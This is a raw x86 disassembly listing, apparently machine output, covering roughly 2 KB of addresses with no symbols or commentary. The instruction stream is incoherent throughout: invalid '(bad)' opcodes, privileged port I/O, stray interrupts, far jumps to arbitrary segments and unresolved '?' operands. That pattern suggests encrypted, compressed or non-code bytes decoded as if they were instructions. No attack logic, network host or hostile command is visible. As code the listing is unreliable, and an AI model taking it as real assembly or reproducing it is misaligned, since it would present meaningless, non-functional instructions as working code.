  4204c7:	dec    ebx
  4204c8:	retf   0xe169
  4204cb:	and    ebx,edi
  4204cd:	ror    ch,1
  4204cf:	lea    eax,[ebx]
  4204d1:	jb     0x42053a
  4204d3:	inc    ebp
  4204d4:	gs and eax,0x48d38cea
  4204da:	lock pop ss
  4204dc:	aam    0xfa
  4204de:	mov    ah,0xc5
  4204e0:	push   es
  4204e1:	add    eax,0x1b8e6253
  4204e6:	out    dx,eax
  4204e7:	jae    0x4204d0
  4204e9:	imul   DWORD PTR [esp+edi*4+0x40a5c45b]
  4204f0:	nop
  4204f1:	mov    al,ds:0xfac80fd1
  4204f6:	add    al,0xf8
  4204f8:	cmp    al,bh
  4204fa:	push   eax
  4204fb:	xchg   edi,eax
  4204fc:	inc    ecx
  4204fd:	je     0x4204ea
  4204ff:	adc    BYTE PTR [edi-0x3f],dl
  420502:	out    0xf1,eax
  420504:	mov    ah,ah
  420506:	xlat   BYTE PTR ds:[ebx]
  420507:	sahf   
  420508:	xor    al,dh
  42050a:	jo     0x4204c7
  42050c:	adc    ah,BYTE PTR [esi-0x186fa8]
  420512:	sar    cl,1
  420514:	bnd jne 0x420536
  420517:	cmp    BYTE PTR [esi-0x1a3c304c],0xa0
  42051e:	jbe    0x420524
  420520:	xor    cl,BYTE PTR [edi+0x25cb3a8c]
  420526:	inc    edi
  420527:	push   ss
  420528:	pop    ebx
  420529:	fs pop edx
  42052b:	pop    ebx
  42052c:	and    edx,eax
  42052e:	mov    es,WORD PTR [ebp-0x14a0e0aa]
  420534:	rcl    esi,1
  420536:	pushf  
  420537:	xor    DWORD PTR [edi+edx*4],esi
  42053a:	rol    BYTE PTR [edx+0x35fb25ed],1
  420540:	nop
  420541:	in     al,dx
  420542:	(bad)  
  420543:	stos   DWORD PTR es:[edi],eax
  420544:	pop    ss
  420545:	sbb    eax,0xb136b664
  42054a:	int    0x7e
  42054c:	int3   
  42054d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42054e:	neg    ecx
  420550:	in     eax,dx
  420551:	push   ecx
  420552:	clc    
  420553:	pop    edx
  420554:	inc    eax
  420555:	inc    esi
  420556:	jg     0x420567
  420558:	mov    cl,0x67
  42055a:	icebp  
  42055b:	inc    edi
  42055c:	sahf   
  42055d:	aam    0xda
  42055f:	outs   dx,BYTE PTR ds:[esi]
  420560:	cmp    BYTE PTR [ecx+0x69ddc106],al
  420566:	fwait
  420567:	sbb    DWORD PTR [esi+edx*4],ecx
  42056a:	out    dx,eax
  42056b:	sbb    ax,0x4361
  42056f:	cmc    
  420570:	arpl   WORD PTR [edi+ecx*4+0x4a],bx
  420574:	fimul  WORD PTR [ecx-0x5f184160]
  42057a:	cmc    
  42057b:	mov    BYTE PTR [eax],0x9
  42057e:	inc    ecx
  42057f:	ror    BYTE PTR [ebp-0x4e8af1d3],0x1e
  420586:	ins    DWORD PTR es:[edi],dx
  420587:	or     DWORD PTR [edi+0x69],ebp
  42058a:	test   eax,0x289f93be
  42058f:	and    ah,dh
  420591:	and    BYTE PTR [ebp-0x71],0x5f
  420595:	in     al,dx
  420596:	jmp    0x1ce6:0x714937a3
  42059d:	in     eax,0x7f
  42059f:	ss scas al,BYTE PTR es:[edi]
  4205a1:	pop    ebp
  4205a2:	dec    esi
  4205a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205a4:	test   DWORD PTR [ecx],edi
  4205a6:	sbb    al,0x9b
  4205a8:	rol    BYTE PTR [eax+0x3d8bafc],0x62
  4205af:	add    al,0xc4
  4205b1:	push   ds
  4205b2:	nop
  4205b3:	sub    al,0x57
  4205b5:	sbb    DWORD PTR [eax-0x72],0x24
  4205b9:	popa   
  4205ba:	mov    al,0x5e
  4205bc:	sbb    al,0xad
  4205be:	test   eax,0x17da0351
  4205c3:	inc    ebp
  4205c4:	push   ebx
  4205c5:	adc    bh,BYTE PTR [ebx-0x319247da]
  4205cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205cc:	and    BYTE PTR [edx-0x58f55a82],0x84
  4205d3:	mov    esp,0x65762aa2
  4205d8:	loopne 0x420638
  4205da:	adc    edx,eax
  4205dc:	mov    bl,0x73
  4205de:	add    edx,edx
  4205e0:	outs   dx,DWORD PTR ds:[esi]
  4205e1:	or     al,0xc2
  4205e3:	sti    
  4205e4:	and    al,0x5
  4205e6:	ds in  eax,dx
  4205e8:	mov    ebx,DWORD PTR [ebp+0x276f4971]
  4205ee:	sbb    ecx,ebp
  4205f0:	sbb    al,0xec
  4205f2:	out    dx,al
  4205f3:	sub    bh,BYTE PTR [ebx+0x7daa376b]
  4205f9:	or     bh,BYTE PTR [ebx]
  4205fb:	adc    DWORD PTR [ecx+0x35],0xce959e7
  420602:	cdq    
  420603:	shl    DWORD PTR [ecx-0x5d4d44b8],cl
  420609:	test   eax,0xca0aadf0
  42060e:	sbb    eax,DWORD PTR [esi+0xb98d61e]
  420614:	cmp    edi,DWORD PTR [edi-0x46]
  420617:	or     cl,BYTE PTR [ebx]
  420619:	jbe    0x420622
  42061b:	jp     0x42060e
  42061d:	pop    ss
  42061e:	cld    
  42061f:	icebp  
  420620:	or     DWORD PTR [edi-0x4fd9b333],eax
  420626:	xchg   ebx,eax
  420627:	sbb    DWORD PTR [eax],edx
  420629:	syscall 
  42062b:	lock xlat BYTE PTR ds:[ebx]
  42062d:	fwait
  42062e:	jae    0x42068e
  420630:	inc    esi
  420631:	fidivr DWORD PTR [ecx-0x21]
  420634:	loopne 0x42065b
  420636:	mov    BYTE PTR [eax],ch
  420638:	mov    ds:0x30c703e8,eax
  42063d:	inc    ecx
  42063e:	push   ecx
  42063f:	dec    edx
  420640:	and    al,0xa1
  420642:	push   ebp
  420643:	dec    edi
  420644:	inc    ebx
  420645:	mov    al,ds:0x69ff8351
  42064a:	mov    eax,ds:0xa3171240
  42064f:	or     al,0x3e
  420651:	xchg   esp,eax
  420652:	repz neg BYTE PTR [ecx+0x34]
  420656:	call   0x9966:0x21e8b822
  42065d:	fxch   st(2)
  42065f:	aad    0x58
  420661:	mov    ch,0xbf
  420663:	cmp    eax,0x3411fcae
  420668:	(bad)  
  420669:	fnstsw WORD PTR [ecx+0x1f]
  42066c:	out    0x3e,eax
  42066e:	cmp    ah,dl
  420670:	dec    ebx
  420671:	xor    DWORD PTR [ecx+edi*2-0x1d],eax
  420675:	jnp    0x420625
  420677:	sbb    BYTE PTR [ebx],al
  420679:	push   ecx
  42067a:	or     BYTE PTR [ecx+0x1f956137],0x99
  420681:	jns    0x42065e
  420683:	aas    
  420684:	stc    
  420685:	jg     0x420699
  420687:	push   ebx
  420688:	cmp    esp,eax
  42068a:	xchg   ecx,eax
  42068b:	sbb    BYTE PTR [edx-0x165b69b0],dl
  420691:	out    0x66,al
  420693:	addr16 adc eax,0x7b2e7826
  420699:	xchg   esp,eax
  42069a:	not    BYTE PTR [esi+0x31bfe69e]
  4206a0:	pushf  
  4206a1:	pop    edi
  4206a2:	ins    DWORD PTR es:[edi],dx
  4206a3:	mov    esp,0x30d95214
  4206a8:	add    eax,0xf8157595
  4206ad:	js     0x4206c8
  4206af:	jg     0x4206be
  4206b1:	addr16 mov eax,ds:0xfae7
  4206b5:	xchg   ebp,eax
  4206b6:	out    dx,al
  4206b7:	mov    esi,edx
  4206b9:	dec    edx
  4206ba:	out    dx,eax
  4206bb:	mov    cl,0xff
  4206bd:	mov    bh,0xcd
  4206bf:	cld    
  4206c0:	repnz out dx,eax
  4206c2:	push   esi
  4206c3:	loopne 0x420660
  4206c5:	sub    BYTE PTR [ecx],0xce
  4206c8:	push   ecx
  4206c9:	jnp    0x4206b7
  4206cb:	out    dx,al
  4206cc:	test   al,0x54
  4206ce:	setp   BYTE PTR [ecx+0x6d]
  4206d2:	fsub   DWORD PTR [ecx+ebp*8-0x74]
  4206d6:	lods   al,BYTE PTR ds:[esi]
  4206d8:	les    eax,FWORD PTR [ebx-0x73df89f7]
  4206de:	arpl   WORD PTR [ebx+ebx*1+0x3c],sp
  4206e2:	cwde   
  4206e3:	add    al,0xc2
  4206e5:	pusha  
  4206e6:	mov    ah,0xd0
  4206e8:	and    DWORD PTR [ebx],ebp
  4206ea:	mov    ebx,0x7f7c5391
  4206ef:	pop    es
  4206f0:	mov    ds:0xbc6e3faa,al
  4206f5:	mov    ds:0xc650ec23,al
  4206fa:	push   cs
  4206fb:	retf   
  4206fc:	ss retf 0xa93d
  420700:	xchg   edx,eax
  420701:	sub    ebp,DWORD PTR [eax+0x4a3f4cad]
  420707:	mov    ebx,0x35b88282
  42070c:	inc    eax
  42070e:	sbb    edi,DWORD PTR [ecx-0x659de1a9]
  420714:	xor    cl,0xa9
  420717:	nop
  420718:	or     ecx,DWORD PTR [esi]
  42071a:	loope  0x420729
  42071c:	push   ebp
  42071d:	pop    ebx
  42071e:	bound  esi,QWORD PTR [ebp+0x6856c2f2]
  420724:	sbb    eax,0x8f763f94
  420729:	retf   0x2818
  42072c:	stc    
  42072d:	mov    dl,0x35
  42072f:	dec    ebx
  420730:	mov    cl,0xc2
  420732:	mov    ecx,ebx
  420734:	vpandn xmm5,xmm1,XMMWORD PTR [esi+edi*2+0x2978681a]
  42073d:	adc    DWORD PTR ds:0x453ef60b,ebx
  420743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420744:	or     eax,0x1a479165
  420749:	push   esi
  42074a:	stos   BYTE PTR es:[edi],al
  42074b:	cld    
  42074c:	mov    ah,0xfe
  42074e:	adc    ebx,DWORD PTR [eax+0x6e89a41e]
  420754:	mov    ds:0x3e7eb87d,al
  420759:	mov    eax,ds:0xe0113e85
  42075e:	xchg   ecx,eax
  42075f:	lods   al,BYTE PTR ds:[esi]
  420760:	jmp    0x42074d
  420762:	push   esp
  420763:	mov    dl,0xb5
  420765:	xor    ebx,DWORD PTR [ebx+0x33]
  420768:	in     eax,0xb8
  42076a:	adc    dh,ch
  42076c:	pop    ebp
  42076d:	xor    eax,0xc207caaf
  420772:	call   0x3e57aff8
  420777:	mov    BYTE PTR [esi+ecx*1],al
  42077a:	mov    ecx,0x1b16bb3
  42077f:	out    0xb7,eax
  420781:	xchg   ecx,eax
  420782:	pop    edx
  420783:	push   esi
  420784:	retf   0x39c0
  420787:	fs aam 0x1e
  42078a:	lods   al,BYTE PTR ds:[esi]
  42078b:	jmp    0x420787
  42078d:	cmp    al,0x87
  42078f:	ins    BYTE PTR es:[edi],dx
  420790:	xor    eax,0x8c0b089e
  420795:	int3   
  420796:	div    esi
  420798:	mov    ds:0x8436d02d,eax
  42079d:	test   DWORD PTR [esi+edi*1-0x72],ecx
  4207a1:	imul   BYTE PTR [esi]
  4207a3:	push   esi
  4207a4:	mov    al,ds:0xfca73595
  4207a9:	dec    ecx
  4207aa:	sub    ah,BYTE PTR [eax+0x30]
  4207ad:	cwde   
  4207ae:	test   eax,0x70f6ef6a
  4207b3:	jge    0x420780
  4207b5:	mov    cl,0x23
  4207b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207b8:	iret   
  4207b9:	xchg   esi,eax
  4207ba:	dec    esi
  4207bb:	push   ebp
  4207bc:	inc    esp
  4207bd:	fsubr  QWORD PTR [ecx-0x65]
  4207c0:	daa    
  4207c1:	mov    al,ds:0x72b86abb
  4207c6:	jnp    0x4207f2
  4207c8:	scas   eax,DWORD PTR es:[edi]
  4207c9:	or     eax,0x7d7895bf
  4207ce:	mov    edx,0xebca6cfa
  4207d3:	push   eax
  4207d4:	inc    edi
  4207d5:	stc    
  4207d6:	fnsave [edi-0x6bdf991d]
  4207dc:	test   esp,esi
  4207de:	dec    ebx
  4207df:	xchg   esi,eax
  4207e0:	sti    
  4207e1:	or     edi,edi
  4207e3:	sbb    ebx,edi
  4207e5:	mov    ebp,0x31c352be
  4207ea:	outs   dx,DWORD PTR ds:[esi]
  4207eb:	iret   
  4207ec:	shl    BYTE PTR [eax],1
  4207ee:	int    0xe4
  4207f0:	shr    ebx,1
  4207f2:	cdq    
  4207f3:	cld    
  4207f4:	test   eax,0x334394c1
  4207f9:	cmp    DWORD PTR [esi],0xa15740c
  4207ff:	fs nop
  420801:	push   ebx
  420802:	shl    DWORD PTR [edx-0xd98bd09],1
  420808:	xor    esi,DWORD PTR [edx]
  42080a:	add    edx,DWORD PTR [esi-0x2ac6f403]
  420810:	dec    ebx
  420811:	cwde   
  420812:	mov    esi,0xbd65c2e4
  420817:	dec    esp
  420818:	outs   dx,DWORD PTR ds:[esi]
  420819:	or     ecx,DWORD PTR [edx+0x6f]
  42081c:	(bad)  
  42081d:	loop   0x420890
  42081f:	aad    0x5b
  420821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420822:	sbb    BYTE PTR [ebx],al
  420824:	pop    ecx
  420825:	bound  ecx,QWORD PTR [edi+0x79699f14]
  42082b:	in     eax,dx
  42082c:	in     al,dx
  42082d:	xor    dl,BYTE PTR [ecx]
  42082f:	jmp    0xb95a8543
  420834:	mov    ebp,0x5e7e7a89
  420839:	jmp    0x9301:0x7c03b76a
  420840:	std    
  420841:	and    ch,BYTE PTR [edi+0x7]
  420844:	bound  eax,QWORD PTR [eax]
  420846:	unpcklps xmm3,XMMWORD PTR [ebx+0x11]
  42084a:	inc    esi
  42084b:	rcr    BYTE PTR [ebx-0x53],cl
  42084e:	inc    ebp
  42084f:	test   eax,0xb92399c3
  420854:	stos   BYTE PTR es:[edi],al
  420855:	fistp  DWORD PTR [esi-0x49]
  420858:	stos   BYTE PTR es:[edi],al
  420859:	jl     0x42085f
  42085b:	or     eax,0xe1780b1e
  420860:	fiadd  DWORD PTR [eax-0x7d]
  420863:	in     eax,0xc6
  420865:	call   0xb900:0x26aabd8a
  42086c:	jle    0x420830
  42086e:	scas   al,BYTE PTR es:[edi]
  42086f:	stc    
  420870:	sub    eax,0x9821dc03
  420875:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420876:	cmp    BYTE PTR [eax],0x60
  420879:	jmp    0x4208c8
  42087b:	push   esi
  42087c:	test   esp,edi
  42087e:	mov    eax,0xd47cba2a
  420883:	nop
  420884:	mov    bh,0x48
  420886:	push   0x369c0efd
  42088b:	pop    ss
  42088c:	adc    al,0x18
  42088e:	cmp    DWORD PTR [edi+eax*1+0x11],ebp
  420892:	add    ah,ah
  420894:	mov    ?,edi
  420896:	jecxz  0x4208b5
  420898:	ret    
  420899:	mov    al,ds:0x65d514f3
  42089e:	in     al,dx
  42089f:	cmp    dl,al
  4208a1:	lock dec ebx
  4208a3:	cmp    cl,BYTE PTR [ecx-0x1b84e552]
  4208a9:	icebp  
  4208aa:	lods   al,BYTE PTR ds:[esi]
  4208ab:	ds hlt 
  4208ad:	lods   eax,DWORD PTR ds:[esi]
  4208ae:	adc    eax,0x378b34b8
  4208b3:	mov    dl,0xde
  4208b5:	push   es
  4208b6:	aaa    
  4208b7:	(bad)  
  4208b9:	ins    DWORD PTR es:[edi],dx
  4208ba:	cmp    al,0x6d
  4208bc:	pop    ebp
  4208bd:	shr    BYTE PTR [esi+0x2b2709b6],0x39
  4208c4:	lods   eax,DWORD PTR ds:[esi]
  4208c5:	scas   al,BYTE PTR es:[edi]
  4208c6:	pop    edi
  4208c7:	xchg   ebx,eax
  4208c8:	push   eax
  4208c9:	and    bh,bl
  4208cb:	je     0x420891
  4208cd:	jb     0x42092d
  4208cf:	inc    esp
  4208d0:	inc    ebx
  4208d1:	and    ch,ch
  4208d3:	pushf  
  4208d4:	mov    esi,0xbc1a57da
  4208d9:	pop    esi
  4208da:	xchg   ebx,eax
  4208db:	out    0x93,eax
  4208dd:	idiv   BYTE PTR [edi]
  4208df:	rcr    DWORD PTR [ebx-0x72810e2c],0x80
  4208e6:	ds (bad) 
  4208e8:	cli    
  4208e9:	call   0xc7870fb6
  4208ee:	jmp    0x4208d6
  4208f0:	dec    esp
  4208f1:	mov    BYTE PTR [ebx+0x2c],bh
  4208f4:	xor    eax,0x422efe4b
  4208f9:	sbb    bl,BYTE PTR [edx]
  4208fb:	and    esp,ecx
  4208fd:	arpl   WORD PTR [eax],si
  4208ff:	xchg   ebp,eax
  420900:	in     eax,dx
  420901:	mov    esi,0x5ad1a850
  420906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420907:	cmc    
  420908:	mov    al,0x89
  42090a:	and    edi,DWORD PTR [eax]
  42090c:	das    
  42090d:	push   ecx
  42090e:	loope  0x4208aa
  420910:	mov    eax,ds:0xed6e4acb
  420915:	call   0x6d29:0x20266573
  42091c:	mov    cl,0x24
  42091e:	mov    ds:0xc01664e1,eax
  420923:	fmulp  st(5),st
  420925:	jb     0x4208f4
  420927:	dec    esi
  420928:	cs call 0x50323217
  42092e:	xor    al,0xd0
  420930:	xor    dh,BYTE PTR [ebp+0x22222235]
  420936:	pop    esp
  420937:	sbb    esi,ebp
  420939:	jecxz  0x420983
  42093b:	jge    0x4208da
  42093d:	dec    edi
  42093e:	hlt    
  42093f:	mov    ebx,0x21ac2ca0
  420944:	scas   al,BYTE PTR es:[edi]
  420945:	btc    DWORD PTR [edx],edi
  420948:	inc    edx
  420949:	push   esp
  42094a:	push   esi
  42094b:	fsubrp st(0),st
  42094d:	or     eax,0x991236f8
  420952:	push   ebx
  420953:	loop   0x420992
  420955:	lock test dl,bh
  420958:	test   ecx,0xf91c50a3
  42095e:	pop    es
  42095f:	popa   
  420960:	into   
  420961:	dec    edx
  420962:	sub    DWORD PTR ds:0x6ea95db2,0xf4dc5a01
  42096c:	push   ds
  42096d:	dec    edi
  42096e:	xchg   ebx,eax
  42096f:	pop    eax
  420970:	dec    ecx
  420971:	fs test cl,bl
  420974:	cmp    al,0x5c
  420976:	and    BYTE PTR [edx-0x72],bh
  420979:	iret   
  42097a:	pop    ss
  42097b:	push   esp
  42097c:	pop    ebx
  42097d:	jmp    0x95:0x5c4876f2
  420984:	adc    eax,DWORD PTR [ebx+0x12540f09]
  42098a:	xchg   ebx,eax
  42098b:	jnp    0x42092c
  42098d:	xor    BYTE PTR [ebx-0x65],cl
  420990:	xchg   DWORD PTR [edi],esi
  420992:	or     eax,0xdb981c28
  420997:	out    dx,al
  420998:	dec    edx
  420999:	xor    al,0x75
  42099b:	mov    dh,0xce
  42099d:	xchg   esp,eax
  42099e:	mov    dl,0x28
  4209a0:	jmp    0xfb5b:0x68c8fa93
  4209a7:	or     al,0xa3
  4209a9:	cmp    al,0x2d
  4209ab:	cmp    ebp,DWORD PTR [edi+0x521b3264]
  4209b1:	mov    ch,0x54
  4209b3:	xor    eax,0x48c95654
  4209b8:	or     ecx,DWORD PTR ds:0xa5d2913f
  4209be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209bf:	bound  ebp,QWORD PTR [edx-0x54e48cdd]
  4209c5:	hlt    
  4209c6:	js     0x420a2a
  4209c8:	gs repz mov bl,0xbd
  4209cc:	dec    ebp
  4209cd:	push   0xffffffa6
  4209cf:	(bad)  
  4209d1:	je     0x420977
  4209d3:	popa   
  4209d4:	xlat   BYTE PTR ds:[ebx]
  4209d5:	pusha  
  4209d6:	enter  0xaab6,0xf
  4209da:	inc    ebx
  4209db:	(bad)  
  4209dc:	xor    edx,DWORD PTR [edx-0x5248c49a]
  4209e2:	push   esp
  4209e3:	sub    ebx,0xffffffd1
  4209e6:	fisub  WORD PTR ds:0x67e34f0d
  4209ec:	pop    ebx
  4209ed:	or     DWORD PTR [edx+edi*1],ebp
  4209f0:	cmp    DWORD PTR [ebx+ecx*2+0x26],esi
  4209f4:	adc    eax,ecx
  4209f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209f7:	ins    BYTE PTR es:[edi],dx
  4209f8:	out    0x7e,al
  4209fa:	add    BYTE PTR [ecx+0x35],cl
  4209fd:	xchg   edi,eax
  4209fe:	imul   ebp,DWORD PTR [esi-0x6e4dc085],0x6dc72226
  420a08:	mov    bl,bl
  420a0a:	push   0x28
  420a0c:	mov    eax,0x1871772d
  420a11:	xchg   ecx,ebx
  420a13:	out    dx,al
  420a14:	xchg   DWORD PTR [eax-0x2636bd2e],edi
  420a1a:	jns    0x420a0f
  420a1c:	xchg   ebp,eax
  420a1d:	dec    ebp
  420a1e:	lea    ebx,[esi-0xaf5f6b6]
  420a24:	dec    esp
  420a25:	test   BYTE PTR [eax+0xa968da8],cl
  420a2b:	(bad)  
  420a2c:	frstor ds:0xbd9343ce
  420a32:	fld    QWORD PTR [edi+0x50c84da9]
  420a38:	cmp    BYTE PTR [ebx+0x75d9f993],bh
  420a3e:	sbb    ch,dh
  420a40:	mov    edi,0xa030f3c2
  420a45:	out    dx,eax
  420a46:	xchg   DWORD PTR [edx-0x5c],ebx
  420a49:	cmp    eax,0xe2e32e13
  420a4e:	sar    ch,cl
  420a50:	cwde   
  420a51:	sti    
  420a52:	push   0xac0203db
  420a57:	push   ebp
  420a58:	jg     0x420ac4
  420a5a:	imul   esi,DWORD PTR [ebp-0x76b85868],0xffffff95
  420a61:	and    DWORD PTR [esi+ebx*2+0x28760a93],esi
  420a68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a69:	stos   BYTE PTR es:[edi],al
  420a6a:	lar    edi,WORD PTR ds:0x71468fb2
  420a71:	outs   dx,BYTE PTR ds:[esi]
  420a72:	xor    ah,ah
  420a74:	repz push ebp
  420a76:	add    esp,DWORD PTR [ebx-0x25b1779]
  420a7c:	xor    dl,ch
  420a7e:	les    ebx,FWORD PTR [edx-0x401b20a6]
  420a84:	mov    eax,ds:0x3b18e0c3
  420a89:	les    ebp,FWORD PTR [ecx+0x4b581588]
  420a8f:	mov    dh,0x25
  420a91:	jl     0x420a1b
  420a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a94:	adc    BYTE PTR [edi+0x3a],0x99
  420a98:	or     BYTE PTR [esi],bh
  420a9a:	cld    
  420a9b:	imul   edx,DWORD PTR [edi-0x64],0x71a9afb
  420aa2:	jg     0x420aa0
  420aa4:	(bad)  
  420aa5:	popf   
  420aa6:	cmp    al,0xd5
  420aa8:	daa    
  420aa9:	shr    BYTE PTR [edi+0x59],1
  420aac:	push   edx
  420aad:	jb     0x420a84
  420aaf:	imul   ebx,DWORD PTR [ebp+0x3298c45b],0xc
  420ab6:	and    eax,0xa1b2a266
  420abb:	mov    bl,0x78
  420abd:	mov    DWORD PTR [ebx+0x58b5ef95],eax
  420ac3:	nop
  420ac4:	jnp    0x420b41
  420ac6:	call   0xf3fa:0x47325a96
  420acd:	daa    
  420ace:	js     0x420b27
  420ad0:	dec    edx
  420ad1:	sub    al,0xee
  420ad3:	fwait
  420ad4:	cdq    
  420ad5:	outs   dx,DWORD PTR ds:[esi]
  420ad6:	(bad)  
  420ad7:	mov    cl,0xa0
  420ad9:	xor    bh,dl
  420adb:	jae    0x420b21
  420add:	mov    ah,0xff
  420adf:	mov    ebx,0xd23e6804
  420ae4:	in     eax,dx
  420ae5:	cli    
  420ae6:	and    esi,ebp
  420ae8:	xor    al,BYTE PTR [eax]
  420aea:	jo     0x420af5
  420aec:	pop    ecx
  420aed:	repz inc edi
  420aef:	repz icebp 
  420af1:	mov    ss,WORD PTR [edx]
  420af3:	xchg   BYTE PTR [esi],bl
  420af5:	push   ecx
  420af6:	and    dl,BYTE PTR [eax+0x49548cbf]
  420afc:	mov    BYTE PTR [ebx-0x16],ah
  420aff:	xchg   ebp,eax
  420b00:	dec    ebx
  420b01:	sbb    eax,DWORD PTR [edx-0x7f8fcac2]
  420b07:	aad    0xb3
  420b09:	outs   dx,DWORD PTR ds:[esi]
  420b0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b0b:	aad    0x23
  420b0d:	iret   
  420b0e:	dec    esp
  420b0f:	add    esp,0xffffffd9
  420b12:	mov    ds:0x78c34075,al
  420b17:	push   edi
  420b18:	push   esp
  420b19:	fidiv  DWORD PTR [edx-0x37c6b510]
  420b1f:	pop    es
  420b20:	fidivr DWORD PTR [ecx]
  420b22:	pop    es
  420b23:	std    
  420b24:	gs dec esp
  420b26:	call   0x32a06614
  420b2b:	adc    al,0x47
  420b2d:	sub    eax,0xfa121bbb
  420b32:	ins    DWORD PTR es:[edi],dx
  420b33:	or     al,0x5d
  420b35:	xchg   ebx,eax
  420b36:	dec    esi
  420b37:	adc    DWORD PTR [esi],ecx
  420b39:	lock fnsave [esi+0x11ef4918]
  420b40:	cwde   
  420b41:	lods   eax,DWORD PTR ds:[esi]
  420b42:	sub    BYTE PTR [esi+0x1123a1bd],al
  420b48:	scas   al,BYTE PTR es:[edi]
  420b49:	mov    esp,0xfa2adca2
  420b4e:	pop    esi
  420b4f:	push   es
  420b50:	popa   
  420b51:	adc    DWORD PTR ds:0x42b03931,edi
  420b57:	and    bl,cl
  420b59:	jmp    0x420bd1
  420b5b:	cs lock nop
  420b5e:	add    bl,BYTE PTR [edx-0x56af712a]
  420b64:	nop
  420b65:	adc    eax,0x8ba7ca55
  420b6a:	sbb    BYTE PTR [ebx+0x3df752c3],bh
  420b70:	jns    0x420b9b
  420b72:	xchg   ecx,eax
  420b73:	pop    ebp
  420b74:	adc    ebx,esp
  420b76:	lds    edx,FWORD PTR [ecx+0x2e]
  420b79:	xchg   edx,eax
  420b7a:	adc    esp,DWORD PTR [ebp+0x3b]
  420b7d:	jg     0x420b67
  420b7f:	addr16 pop ecx
  420b81:	xchg   edi,eax
  420b82:	rcr    DWORD PTR [esi+edi*2-0x72],0x45
  420b87:	loop   0x420b14
  420b89:	sub    ebx,DWORD PTR [edi]
  420b8b:	(bad)  
  420b8c:	fstp   TBYTE PTR [eax+0x30e74a48]
  420b92:	mov    WORD PTR [esi-0x2e4ebc0d],?
  420b98:	(bad)  
  420b99:	fisub  WORD PTR [ebx]
  420b9b:	pusha  
  420b9c:	add    ah,BYTE PTR [eax]
  420b9e:	test   DWORD PTR [edi],eax
  420ba0:	shl    BYTE PTR [eax],1
  420ba2:	cmp    eax,0x9cbf8328
  420ba7:	pop    edx
  420ba8:	nop
  420ba9:	jmp    FWORD PTR [ebp+0x30]
  420bac:	ja     0x420bc1
  420bae:	sbb    al,0x6c
  420bb0:	cmp    eax,0x6bc32d2
  420bb5:	dec    edi
  420bb6:	or     bl,BYTE PTR [ebp-0x2972cb62]
  420bbc:	mov    edx,0x3531d4db
  420bc1:	repnz pop ecx
  420bc3:	(bad)  
  420bc4:	jecxz  0x420bc1
  420bc6:	mov    bh,0xb0
  420bc8:	rol    ebp,1
  420bca:	or     al,0xa0
  420bcc:	mov    dl,0x0
  420bce:	cdq    
  420bcf:	jbe    0x420bff
  420bd1:	xchg   esp,eax
  420bd2:	xchg   edi,eax
  420bd3:	mov    bl,0x78
  420bd5:	xlat   BYTE PTR ds:[ebx]
  420bd6:	adc    eax,0xc4c3081a
  420bdb:	lahf   
  420bdc:	xor    al,0xed
  420bde:	out    0x8,eax
  420be0:	ins    BYTE PTR es:[edi],dx
  420be1:	fbstp  TBYTE PTR [ecx+0x14]
  420be4:	pop    es
  420be5:	cld    
  420be6:	rol    BYTE PTR [edx],cl
  420be8:	stc    
  420be9:	ret    
  420bea:	test   BYTE PTR [ebx+0xfd46dcb],cl
  420bf0:	aad    0xb0
  420bf2:	mov    cl,0xba
  420bf4:	push   ds
  420bf5:	push   ds
  420bf6:	(bad)  
  420bf7:	clc    
  420bf8:	push   cs
  420bf9:	mov    eax,ds:0xcef69927
  420bfe:	fisttp QWORD PTR [ebp-0x63c0e76a]
  420c04:	ret    0xaf48
  420c07:	out    0x67,al
  420c09:	in     eax,dx
  420c0a:	js     0x420c6c
  420c0c:	mov    bh,0x27
  420c0e:	mov    ecx,edx
  420c10:	imul   ebp,DWORD PTR [ebp+0x1af20a68],0xffffffe1
  420c17:	mov    eax,ds:0xdcdd9b0c
  420c1c:	mov    eax,ds:0xa634226a
  420c21:	add    eax,0xf4698b1d
  420c26:	jle    0x420bcd
  420c28:	jb     0x420c0f
  420c2a:	ror    DWORD PTR [ebp-0x62],cl
  420c2d:	imul   dl
  420c2f:	sti    
  420c30:	xor    BYTE PTR [ecx-0x54a1c023],dl
  420c36:	xchg   esi,eax
  420c37:	mov    DWORD PTR ds:0x4b6bf583,0x4c1f6dcf
  420c41:	lea    edi,[edx+0x7b39d433]
  420c47:	adc    edi,DWORD PTR [esi-0x17e586d4]
  420c4d:	push   ebp
  420c4e:	jecxz  0x420c11
  420c50:	xchg   BYTE PTR [edi],ah
  420c52:	mov    ah,0xbc
  420c54:	mov    cl,0xd8
  420c56:	mov    dh,0x47
  420c58:	fwait
  420c59:	cmp    eax,0x51046cb4
  420c5e:	clc    
  420c5f:	mov    ebx,0xd610128d
  420c64:	push   ds
  420c65:	jp     0x420cb3
  420c67:	retf   0xc289
  420c6a:	in     al,0x3f
  420c6c:	jg     0x420ca4
  420c6e:	hlt    
  420c6f:	xchg   ebp,eax
  420c70:	test   BYTE PTR ss:[eax-0x2b],0xb7
  420c75:	xor    bl,bl
  420c77:	xchg   edi,eax
  420c78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c79:	mov    ebx,0xd00d0841
  420c7e:	pusha  
  420c7f:	arpl   di,bx
  420c81:	dec    ecx
  420c82:	repnz dec eax
  420c84:	adc    DWORD PTR ds:0x8eb57d49,0x58
  420c8b:	cdq    
  420c8c:	sbb    eax,0x657bd221
  420c91:	adc    ecx,DWORD PTR [esi]
  420c93:	jmp    0xff52:0x1083437c
  420c9a:	imul   eax,DWORD PTR ds:0xcd3dd6a5,0xffffff9a
  420ca1:	outs   dx,BYTE PTR ss:[esi]
  420ca3:	and    eax,0xd6903c3
  420ca8:	faddp  st(6),st
  420caa:	sbb    al,0x22
  420cac:	jp     0x420ca5
  420cae:	cs jne 0x420cb9
